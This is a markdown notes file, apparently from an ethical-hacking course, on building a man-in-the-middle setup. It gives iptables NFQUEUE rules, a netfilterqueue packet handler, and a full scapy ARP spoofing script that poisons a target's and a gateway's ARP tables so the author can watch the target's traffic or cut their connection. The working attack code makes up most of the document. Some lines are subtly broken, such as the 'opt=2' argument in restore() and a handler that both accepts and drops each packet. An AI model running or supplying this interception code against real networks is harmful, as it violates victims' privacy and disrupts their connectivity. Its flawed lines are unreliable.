# creating a Proxy
```
iptables -I FORWARD -j NFQUEUE --queue-num 0 
```
### iptables -> the program that allow us to trap all the packet in queue 

### FORWARD -> all the packet thae forward change queue

### NFQUEUE - > net filter queue

---
 ## you need to install the net filter queue
 ```
 root@kali:/opt/pycharm-community-2019.1.1/bin# pip install netfilterqueue
 ```
 ## or this 
```
sudo apt-get install python-netfilterqueue

```
 ---
 ---
 # to get the script work 
 ```
 #!/usr/bin/env python
import netfilterqueue

def process_packet(packet):
    print(packet) # it show us all the packet that the target used and entered in the internet..
    packet.accept() # to access
    packet.drop() # it allow us to cut the net internet connection of the target client

queue = netfilterqueue.NetfilterQueue() # created an instance of netFilterQue object
queue.bind(0, process_packet) # bind() : to connect or bind this queue to the queue that we created here
queue.run() # to run the queue that we created
 ```
 #### and this
 ```
 #!/usr/bin/env/ python

import scapy.all as scapy
import time
import sys

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_List = scapy.srp(arp_request_broadcast, timeout = 1 , verbose=False)[0]

    return answered_List[0][1].hwsrc


def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose =False)

def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(opt=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4,verbose=False)

target_ip = "10.0.2.15"
getway_ip = "10.0.2.1"


try:
    sent_packets_count = 0
    while True:
        spoof(target_ip, getway_ip)
        spoof(getway_ip, target_ip)
        sent_packets_count = sent_packets_count+2
        print("\r[+] Sent two packets " + str(sent_packets_count)),
        sys.stdout.flush()
        time.sleep(2)
except KeyboardInterrupt:
    print("[+] Detected CTRL + C ...... REsetting ARP tables ......Please wait.\n")
    restore(target_ip, getway_ip)
    restore(getway_ip, target_ip)
 ```
 ---
 # the result will cut the internet connection in the target and see all the packet that he/she used!!!
 ---
 ---
 ### if i want to see all packet in my computer with usin this command
 ```
 iptables -I OUTPUT -j NFQUEUE --queue-num 0 
 ```
### and then
```
iptables -I INPUT -j NFQUEUE --queue-num 0

```
---
---
---
# Converting Packet to Scapy Packet
```
#!/usr/bin/env python
import netfilterqueue
import scapy.all as scapy

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    print(scapy_packet.show())
    print(packet) # it show us all the packet that the target used and entered in the internet..
    # print(packet.get_payload()) # it show me the actual contace it the packet itself
    packet.accept() # to access
    # packet.drop() # it allow us to cut the net internet connection of the target client

queue = netfilterqueue.NetfilterQueue() # created an instance of netFilterQue object
queue.bind(0, process_packet) # bind() : to connect or bind this queue to the queue that we created here
queue.run() # to run the queue that we created
```